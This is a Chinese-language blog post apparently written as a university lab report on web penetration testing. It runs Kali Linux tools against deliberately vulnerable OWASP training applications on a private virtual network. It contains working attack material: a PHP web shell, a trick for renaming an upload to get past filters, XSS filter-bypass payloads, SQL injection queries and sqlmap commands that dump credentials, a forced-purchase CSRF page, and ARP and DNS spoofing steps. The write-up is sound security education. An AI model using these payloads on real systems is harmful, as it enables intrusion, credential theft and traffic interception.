---
layout:     post
title:      "网络安全技术基础"
subtitle:   "webSecurity"
date:       2022-04-15 12:00:00
author:     "yosin"
header-img: "img/post-bg-signal-system.jpg"
katex: true
tags:
    - 网络安全
---


## 基于Kali-Linux及OWASP靶机的Web渗透实验

### 实验目的

1.了解常用渗透测试方法及原理

2.掌握Kali工具集的使用

3.探索Kali工具的实现方法

4.拥有对服务器进行简单渗透测试的能力

### 前中期实验内容

1.利用注入的脆弱性

​	1.1 恶意使用文件包含和上传

​	1.2 利用OS命令注入

​	1.3 利用XML外部实体注入

​	1.4 使用Hydra爆破密码

​	1.5 使用Burp Suite执行登录页面的字典爆破

​	1.6 通过XSS获得会话Cookie

​	1.7 逐步执行基本的SQL注入

​	1.8 使用SQLMap发现和利用SQL注入

​	1.9 使用Metasploit攻击Tomcat的密码

​	1.10 使用Tomcat管理器来执行代码



2.中间人攻击

​	2.1 使用Ettercap执行欺骗攻击

​	2.2 使用Wireshark执行MITM以及捕获流量

​	2.3 执行DNS欺骗并重定向流量

​	2.4 ARP欺骗攻击



### 实验原理及步骤

#### 环境配置

使用VMWarePro运行Kali-Linux及OWASP靶机，分别配置IP为`192.168.52.132`,`192.168.52.131`.

使用`ping`命令验证虚拟机之间的通信

![image-20220408181845367](/img/security/image-20220408181845367.png)

使用浏览器验证OWASP项目可用

![image-20220408182200282](/img/security/image-20220408182200282.png)

#### 实验一

##### 1.1 恶意使用文件包含和上传

初安全级别的代码

- 代码特点：不进行类型检查
- 渗透方法：可以直接上传木马文件

中安全级别的级代码

- 代码特点：会判断文件MIME类型（content-type）和文件大小

`$uploaded_type == "image/jpeg"`

- 渗透方法：通过代理/拦截的办法先把木马文件修改为允许上传的类型，然后再forward给DVWA

高安全级别的代码

- 代码特点：会判断文件后缀和文件大小
- 渗透方法：采用文件包含的形式，把木马文件嵌入到允许上传类型的文件中，然后再执行生成代码生成木马文件。

1.初级安全级别

直接上传`webshell.php`

```php
<? 
system($_GET['cmd']); 
echo '<form method="post" action="../../hackable/uploads/webshell.php"><input type="text" name="cmd"/></form>'; 
?>
```

通过地址栏访问`http://192.168.52.131/dvwa/hackable/uploads/webshell.php?cmd=/sbin/ifconfig` 得到`/sbin/ifconfig`命令结果。实现可以通过地址栏输入命令行并成功执行的结果。

![image-20220409145119642](/img/security/image-20220409145119642.png)

2.中级安全级别

方法一：使用BuipSuite绕过文件类型限制

![image-20220409155855047](/img/security/image-20220409155855047.png)

将类型修改为`image/jpeg`即可上传成功。



方法二：把php脚本伪造成为jpg格式

编写如下两个脚本文件

```php
# rename.php
<? 
system('mv ../../hackable/uploads/webshell.jpg ../../hackable/uploads/webshell.php'); 
?>
    
# webshell.php
<? 
system($_GET['cmd']); 
echo '<form method="post" action="../../hackable/uploads/webshell.php"><input type="text" name="cmd"/></form>'; 
?>
```

更改文件后缀为.jpg并上传

在文件包含模块中执行`http://192.168.52.131/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/rename.jpg`即可将`webshell.jpg`改为`webshell.php`。

再次运行`webshell.php`即可获得命令行操作权限。

##### 1.2 命令注入

 初安全级别的代码

- 代码特点：不进行类型检查
- 渗透方法：可以直接上传木马文件

中安全级别的级代码

- 代码特点：会判断文件MIME类型（content-type）和文件大小

`$uploaded_type == "image/jpeg"`

- 渗透方法：通过代理/拦截的办法先把木马文件修改为允许上传的类型，然后再forward给DVWA

高安全级别的代码

- 代码特点：限制输入为IP地址类型，四段数字组成，由"."分隔开

```php
$target = stripslashes( $target ); 

// Split the IP into 4 octects
    $octet = explode(".", $target);
    
    // Check IF each octet is an integer
    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {
    
    // If all 4 octets are int's put the IP back together.
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
     
```

- 渗透方法：较难渗透

##### 1.3  使用Burp Suite执行登录页面的字典爆破

实验步骤

1.首先在相应页面填写登录请求，并用Burp Suite拦截。

![image-20220416155946386](/img/security/image-20220416155946386.png)

2.选择`Send to the Intruder` ,并进入`Intruder`页面，选择`Positions`选项卡，并选中`username`和`password`添加成`Add`，设置`Attack type`为`Cluster bomb` 

![image-20220416161313884](/img/security/image-20220416161313884.png)

3.在`payload`中设置攻击字符串集合

![image-20220416165041542](/img/security/image-20220416165041542.png)

也可以加载已有的字典文件

![image-20220416171713105](/img/security/image-20220416171713105.png)

4.选择`Start Attack`后，将结果按`Length`排序。发现存在一个长度不一致的组合

![image-20220416172518072](/img/security/image-20220416172518072.png)

5.将代理页面`username`与`password`分别修改成上述结果，成功登录

![image-20220416172701157](/img/security/image-20220416172701157.png)

![image-20220416172729481](/img/security/image-20220416172729481.png)

6.补充：密码集合生成工具--CUPP

可通过社会工程学，生成一些与攻击目标相关的密码集合。

![image-20220416172833341](/img/security/image-20220416172833341.png)

![image-20220416172920941](/img/security/image-20220416172920941.png)

##### 1.4  XSS攻击

跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。

反射型/DOM型跨站攻击：服务器接收到数据，原样返回给用户，整个过程没有自身的存储过程（存入数据库）无法直接攻击其他用户。当然这两类攻击也可以利用钓鱼、垃圾邮件等手段产生攻击其他用户的效果。
存储型跨站攻击：

- 入库处理
  目标网页有攻击者可控的输入点
  输入信息可以在受害者的浏览器中显示
  输入几倍攻击的可执行脚本，且在信息输入和输出的过程中没有特色字符的过来和字符转义等防护措施，或者说防护措施可以通过异地哦给你的手段绕过。
- 出库处理
  浏览器将输入解析为脚本，并具备执行该脚本的能力
  这四个条件缺一不可。

常用XSS测试方法

1、闭合标签测试
2、大小写混合测试（JavaScript不区分大小写的特性）
3、多重嵌套测试
4、宽字节绕过测试
5、多标签测试

初级安全级别

```php
 <?php
if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
 $isempty = true;
} else {
      
 echo '<pre>';
 echo 'Hello ' . $_GET['name'];
 echo '</pre>';
    
}
?> 
```

- 代码特点：对输入不进行检查，直接执行输入内容
- 攻击方法：可输入攻击脚本

```js
<script>alert(/xss/)</script>
```

![image-20220417183132946](/img/security/image-20220417183132946.png)

中级安全级别

- 代码特点：检查`<script>`标签

```php
echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
```

- 攻击方法：方法1：多重嵌套：
  `<scr<script>ipt>alert(/xss/)</script>`
  方法2：大小写绕过：
  `<sCRipt>alert(/xss/)</sCRipt>`

高级安全级别

- 代码特点：使用`htmlspecialchars`将输入内容变为html实体

```php
echo 'Hello ' . htmlspecialchars($_GET['name']); 
```

- 攻击方法：较难渗透

使用`beef-xss`工具

1.在攻击机上运行`beef-xss`，并获取其运行地址

![image-20220417203227073](/img/security/image-20220417203227073.png)

2.在目标机中输入上述地址

![image-20220417203355306](/img/security/image-20220417203355306.png)

3.在`beef-xss`后台即可看到劫持机相关信息

![image-20220417203450472](/img/security/image-20220417203450472.png)

4.使用`beef-xss`相关工具，即可执行不同命令

- alert

![image-20220417203554231](/img/security/image-20220417203554231.png)

![image-20220417203605132](/img/security/image-20220417203605132.png)

- redirect

![image-20220417203621128](/img/security/image-20220417203621128.png)

![image-20220417203629767](/img/security/image-20220417203629767.png)

##### 1.5 sql注入

如果我们发现目标可以通过sql注入，那我们可以来实施更高级的攻击，来获取更多信息。

第一步是弄清数据库和表的名称，我们通过查询`information_schema`数据库来实现，它是 MySQL 中储存所有数据库、表和列信息的数据库。

一旦我们知道了数据库和表的名称，我们在这个表中查询所有列，来了解我们需要查找哪一列，它的结果是`user`和`password`。

最后，我们注入查询来请求`dvwa`数据库的`users`表中的所有用户名和密码。

1.查看该表有多少列

```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 order by 1 --+
```

- `--`表示将后面的部分注释掉，`+`表空格
- 通过按列排序，来判断该表有多少行

![image-20220417212850858](/img/security/image-20220417212850858.png)

![image-20220417214522920](/img/security/image-20220417214522920.png)

2.联合注入

```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 order by 1 union select 1,2 -- 
```

- 可以把两列数据竖着连起来

3.获取数据库的版本信息及用户

```sql
1' union select @@version,current_user() -- '
```

![image-20220417220245164](/img/security/image-20220417220245164.png)

4.查询用户表

```sql
1' union select table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%' -- '
```

![image-20220417220438810](/img/security/image-20220417220438810.png)

5.查询表的字段名

```sql
1' union select column_name, 1 FROM information_schema.columns WHERE table_name = 'users' -- '
```

![image-20220417221811964](/img/security/image-20220417221811964.png)

6.查询其中的`user` 和`password`

```sql
1' union select user, password FROM dvwa.users  -- '
```

![image-20220417221951565](/img/security/image-20220417221951565.png)

7.使用工具进行哈希解密，如`cmd5`

![image-20220417222100952](/img/security/image-20220417222100952.png)

##### 1.6 使用sqlmap工具

选择测试页面

![image-20220418163129030](/img/security/image-20220418163129030.png)

1.了解sqlmap基本参数

```
-u 指定目标url
-p 指定注入的字段
-D 选择使用哪个数据库
-T 选择使用哪个表
--dump 获取字段中的数据
--current-user   查询目标DBMS当前用户
--current-db     查询目标DBMS当前数据库
--tables      枚举DBMS数据库中所有的表
--columns     枚举DBMS数据库表中所有的列
```

2.探测当前数据库

`sqlmap -u "http://192.168.52.131/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"  -p "username" --current-db --current-user`

![image-20220418163828174](/img/security/image-20220418163828174.png)

3.获取`nowasp`数据库中的信息

`sqlmap -u "http://192.168.52.131/mutillidae/index.php?page=user-info.php&username=jotto&password=jotto&user-info-php-submit-button=View+Account+Details" -p "username" -D "nowasp" --tables  `

![image-20220418164214968](/img/security/image-20220418164214968.png)

4.查看`accounts`表中用户信息

`sqlmap -u "http://192.168.52.131/mutillidae/index.php?page=user-info.php&username=jotto&password=jotto&user-info-php-submit-button=View+Account+Details" -p "username" -D "nowasp" -T "accounts" --dump`

![image-20220418183429636](/img/security/image-20220418183429636.png)

##### 1.7 使用metasploit渗透Tomcat

- 基本步骤

1、 使用nmap进行端口扫描
2、 使用search命令查找相关模块
3、 使用use调度模块
4、 使用info查看模块信息
5、 选择payload作为攻击
6、 设置攻击参数
7、 渗透攻击

- 实现

1.nmap扫描

![image-20220418193308278](/img/security/image-20220418193308278.png)

2.根据端口运行的应用查找合适的模块

![image-20220418193551798](/img/security/image-20220418193551798.png)

3.选择其中之一来使用，并查看模块信息

![image-20220418193651685](/img/security/image-20220418193651685.png)

4.设置相关参数

![image-20220418193727937](/img/security/image-20220418193727937.png)

5.执行，找到登录的账号密码

![image-20220418193755751](/img/security/image-20220418193755751.png)

##### 1.8 使用Tomcat管理器来执行代码

1.登录从实验1.7获得的账号，进入后台管理器

![image-20220418193938306](/img/security/image-20220418193938306.png)

2.上传`cmd`应用

![image-20220418194735509](/img/security/image-20220418194735509.png)

3.执行命令

![image-20220418194802428](/img/security/image-20220418194802428.png)

##### 1.9 CSRF攻击

1.准备

`192.168.52.131`为服务器

`192.168.52.132`为客户机

` http://192.168.52.131/WackoPicko`为攻击网站，本实验将进行强制用户购买的操作。

2.了解商品购买流程

`/WackoPicko/cart/action. php?action=add&picid=8 `，它是添加图片到购物车的请求。

`/WackoPicko/cart/confirm.php`在我们点击相应按钮时调用，它可能必须用于购买。

另一个可被攻击者利用的是购买操作的 POST 调用：`/WackoPicko/cart/action. php?action=purchase`，他告诉应用将图片添加到购物车中并收相应的 Tradebux。

3.攻击者上传自己的商品

使用`attack`账号，上传商品，收取费用为20.

![image-20220428152104357](/img/security/image-20220428152104357.png)

确认当前的账户余额为60

![image-20220428152011300](/img/security/image-20220428152011300.png)

4.编写评论，使点击的用户将重定向到购买页面,评论区输入以下内容

```html
This image looks a lot like <a href="http://192.168.52.132/wackopurchaseXjj.html" target="_blank">this</a>
```



在攻击机上启动Apache服务，在其目录下创建`wachopurchase.html`，写入如下内容

```html
<html> 
<head></head> 
<body onLoad='window.location="http://192.168.52.131/WackoPicko/cart/action.php?action=purchase";setTimeout("window. close;",1000)'> 
<h1>Error 404: Not found</h1> 
<iframe src="http://192.168.52.131/WackoPicko/cart/action.php?action=add&picid=17"> 
<iframe src="http://192.168.52.131/WackoPicko/cart/review.php" > 
<iframe src="http://192.168.52.131/WackoPicko/cart/confirm.php"> 
</iframe> 
</iframe> 
</iframe> 
</body>
```

5.实验结果

在用户点击两次评论后，`attack`账户增加40

![image-20220428153501481](/img/security/image-20220428153501481.png)

#### 实验二 中间人攻击

##### 2.1 使用Ettercap执行欺骗攻击

1.搭建客户机、服务机、攻击机

- 将win7虚拟机作为客户机，ip为192.168.52.133
- 将漏洞虚拟机作为服务机，ip为192.168.52.131
- 将kali作为攻击机，ip为192.168.52.132

2.启动ettercap工具，开始嗅探，捕捉当前网段存在的ip

![image-20220424190614158](/img/security/image-20220424190614158.png)

3.设置两个target，进行MITM

![image-20220424190656884](/img/security/image-20220424190656884.png)

4.原理

我们会通过单一网络接口接受并发送信息。当我们的目标通过不同网络接口到达时，我们选择桥接模式。例如，如果我们拥有两个网卡，并且通过其一连接到客户端，另一个连接到服务端。

在嗅探开始之后，我们选择了目标。

> 事先选择目标

> 单次攻击中，选择唯一必要主机作为目标非常重要，因为毒化攻击会生成大量网络流量，并导致所有主机的性能问题。在开始 MITM 攻击之前，弄清楚那两个系统会成为目标，并仅仅欺骗这两个系统。

一旦设置了目标，我们就可以开始 ARP 毒化攻击。`Sniffing remote connections`意味着 Ettercap 会捕获和读取所有两端之间的封包，`Only poison one way`在我们仅仅打算毒化客户端，而并不打算了解来自服务器或网关的请求时（或者它拥有任何对 ARP 毒化的保护时）非常实用。

##### 2.2 使用WireShark进行捕捉

1.用客户机访问服务机页面，实现登录

![image-20220424191317093](/img/security/image-20220424191317093.png)

2.在攻击机的wireshark中，查看发送的请求包，可以捕捉到账号及密码

![image-20220424191411886](/img/security/image-20220424191411886.png)

##### 2.3 DNS欺骗攻击

1.修改`/etc/ettercap/etter.dns`文件，设置dns重定向。将所有的地址都重定向到`kali`的地址。

![image-20220425230904903](/img/security/image-20220425230904903.png)

2.设置客户机为`target1`，网关为`target2`。

![image-20220425230846763](/img/security/image-20220425230846763.png)

3.开启`dns_spoof`插件

![image-20220425231234790](/img/security/image-20220425231234790.png)

4.登录客户机查看结果

![image-20220425213124235](/img/security/image-20220425213124235.png)

![image-20220425213145072](/img/security/image-20220425213145072.png)

##### 2.4 ARP欺骗攻击

ARP欺骗是通过冒充网关或其他主机使得到达网关或主机的流量通过攻击手段进行转发。从而控制流量或得到机密信息。ARP欺骗不是真正使网络无法正常通信，而是ARP欺骗发送虚假信息给局域网中其他的主机，这些信息中包含网关的IP地址和主机的MAC地址；并且也发送了ARP应答给网关，当局域网中主机和网关收到ARP应答更新ARP表后，主机和网关之间的流量就需要通过攻击主机进行转发。

1.使用`arpspoof`工具进行断网攻击

`aprspoof -i eth0 -t 192.168.52.131 192.168.52.0`

即可对目标主机进行断网攻击。
